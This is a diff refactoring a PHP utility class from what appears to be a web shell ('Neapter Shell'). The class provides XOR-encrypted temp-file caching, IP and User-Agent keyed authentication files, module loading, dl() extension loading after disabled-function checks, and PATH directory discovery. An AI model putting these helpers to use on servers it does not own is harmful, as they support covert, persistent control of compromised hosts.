@@ -35,6 +35,7 @@ class Utils
     {
         $aTmpDirs = array(
             @ $_ENV['TMP'],
+            @ $_ENV['TEMP'],
             ini_get('session.save_path'),
             ini_get('upload_tmp_dir'),
             ini_get('soap.wsdl_cache_dir'),
@@ -66,23 +67,16 @@ class Utils
          * Domyslny klucz
          */
         if (!$sKey) {
-            $sKey = $this->getUniqueKey();
+            $sKey = $this->getEncryptionKey();
         }
 
-        /**
-         * Musza wystepowac jakies dane
-         */
         if (($iDataLen = strlen($sData)) === 0) {
             return '';
         }
 
         $iKeyLen = strlen($sKey);
-
         $sNewData = '';
 
-        /**
-         * Szyfrowanie
-         */
         for ($i = 0; $i < $iDataLen; ++$i) {
             $sNewData .= chr(
                 ord(substr($sData, $i, 1)) ^ ord($sKey[$i % $iKeyLen])
@@ -330,14 +324,19 @@ class Utils
      *
      * @return string
      */
-    public function getUniqueKey()
+    public function getEncryptionKey()
     {
         return sha1(Request::getServer('PATH'), true);
     }
 
+    /**
+     * Get prefix for all cache data
+     *
+     * @return string
+     */
     public function getUniquePrefix()
     {
-        return substr(sha1(Request::getServer('PATH')), 0, 10) . '_';
+        return substr(sha1(Request::getServer('SCRIPT_NAME')), 0, 10) . '_';
     }
 
     /**
@@ -352,6 +351,12 @@ class Utils
         return $this->getTmpDir() . '/' . $this->getUniquePrefix() . md5($sKey);
     }
 
+    /**
+     * Get data stored in cache by key name
+     *
+     * @param  string $sKey Jey bane
+     * @return mixed
+     */
     public function cacheGet($sKey)
     {
         $sFile = $this->cacheGetFile($sKey);
@@ -381,6 +386,12 @@ class Utils
         }
     }
 
+    /**
+     * Remove data from cache by key
+     *
+     * @param  string $sKey Key name
+     * @return bool
+     */
     public function cacheDel($sKey)
     {
         $sFile = $this->cacheGetFile($sKey);
@@ -392,6 +403,13 @@ class Utils
         return (bool) @unlink($sFile);
     }
 
+    /**
+     * Put data into cache
+     *
+     * @param  string $sKey   Key name
+     * @param  mixed  $mValue Data to store
+     * @return bool
+     */
     public function cacheSet($sKey, $mValue)
     {
         $sFile = $this->cacheGetFile($sKey);
@@ -401,11 +419,22 @@ class Utils
         return (bool) @ file_put_contents($sFile, $this->encrypt($sValue));
     }
 
+    /**
+     * Based on IP and User-Agent get unique key name for authentication
+     *
+     * @return string
+     */
     public function getAuthFileKey()
     {
         return md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
     }
 
+    /**
+     * Load Neapter Shell modules and put it in cache
+     *
+     * @param  string $sPath Full path to file with modules
+     * @return bool
+     */
     public function loadModuleFromLocation($sPath)
     {
         if (($sData = @file_get_contents($sPath)) === false) {
@@ -417,9 +446,14 @@ class Utils
         return $this->loadModules();
     }
 
+    /**
+     * Remove all cached modules
+     *
+     * @return bool
+     */
     public function removeLoadedModules()
     {
-        return $this->cacheDel('modules', '');
+        return $this->cacheDel('modules');
     }
 
     /**
@@ -427,7 +461,7 @@ class Utils
      *
      * @access public
      * @param  string $sExtension Nazwa rozszerzenia lub sciezka do pliku
-     * @return boolean             TRUE w przypadku pomyslnego zaladowania biblioteki
+     * @return boolean            True w przypadku pomyslnego zaladowania
      */
     public function dl($sExtension)
     {
@@ -449,15 +483,20 @@ class Utils
          * i nie moze znajdowac sie na liscie wylaczonych funkcji
          */
         if (!$this->isSafeMode() && ini_get('enable_dl')
-            && !in_array('dl', $this->oUtils->getDisabledFunctions())
+            && !in_array('dl', $this->getDisabledFunctions())
             && function_exists('dl')
         ) {
-            return dl($sExtension);
+            return @dl($sExtension);
         }
 
         return false;
     }
 
+    /**
+     * Load modules from cache file
+     *
+     * @return bool
+     */
     public function loadModules()
     {
         if (false === $sData = $this->cacheGet('modules')) {
@@ -472,7 +511,10 @@ class Utils
         return true;
     }
 
-    public function autoloadModules()
+    /**
+     * Autoload extensions from cache file
+     */
+    public function autoloadExtensions()
     {
         if (false === $aAutoload = $this->cacheGet('autoload')) {
             return ;
@@ -487,7 +529,13 @@ class Utils
         }
     }
 
-    public function autoloadModulesAdd(array $aMod)
+    /**
+     * Add extension to autoload
+     *
+     * @param  array $aMod Name of module
+     * @return bool
+     */
+    public function autoloadExtensionsAdd(array $aMod)
     {
         if (false === $aModules = $this->cacheGet('autoload')) {
             $aModules = array();
@@ -506,7 +554,12 @@ class Utils
         return $this->cacheSet('autoload', $aModules);
     }
 
-    public function autoloadModulesGet()
+    /**
+     * Get list of all autoloaded extensions
+     *
+     * @return array
+     */
+    public function autoloadExtensionsGet()
     {
         if (false === $aModules = $this->cacheGet('autoload')) {
             return array();
@@ -515,27 +568,57 @@ class Utils
         return $aModules;
     }
 
-    public function getPathes()
+    /**
+     * Get list of all directories in PATH environment variable
+     *
+     * @return array
+     */
+    public function getEnvironmentPathes()
     {
-        $aPath = array();
+        $sIndexPath = '';
 
-        if (!empty($_SERVER['PATH'])) {
-            $aPath = explode(':', $_SERVER['PATH']);
-        } else {
-            $aPath = array();
+        /* Windows contains PATH, windows Path environment file*/
+        foreach ($_SERVER as $sKey => $sValue) {
+            if (strtolower($sKey) === 'path') {
+                $sIndexPath = $sKey;
+                break;
+            }
         }
 
-        $aPath = $aPath + array(
-            '/usr/bin/',
-            '/usr/local/bin/',
-            '/bin',
-            '/usr/local/sbin',
-            '/usr/sbin',
-            '/sbin'
-        );
-        $aPath = array_unique($aPath);
+        if (!$sIndexPath) {
+            return array();
+        }
 
-        return array_filter($aPath, 'is_dir');
+        /* Different separator for OS */
+        $sSeparator = $this->isWindows() ? ';' : ':';
+        $aPathes = explode($sSeparator, $_SERVER[$sIndexPath]);
+
+        if ($this->isWindows()) {
+            $aPathes = array_merge(
+                $aPathes,
+                array(
+                    'C:\\Windows\\system32'
+                )
+            );
+        } else {
+            $aPathes = array_merge(
+                $aPathes,
+                array(
+                    '/usr/bin/',
+                    '/usr/local/bin/',
+                    '/bin',
+                    '/usr/local/sbin',
+                    '/usr/sbin',
+                    '/sbin'
+                )
+            );
+        }
+
+        $aPathes = array_filter($aPathes);
+        $aPathes = array_unique($aPathes);
+        $aPathes = array_filter($aPathes, 'is_dir');
+
+        return $aPathes;
     }
 
     /**
@@ -547,6 +630,6 @@ class Utils
     {
         $oShell = new ReflectionClass('Shell');
 
-        return $oShell->getFilename();
+        return $oShell->getFileName();
     }
 }
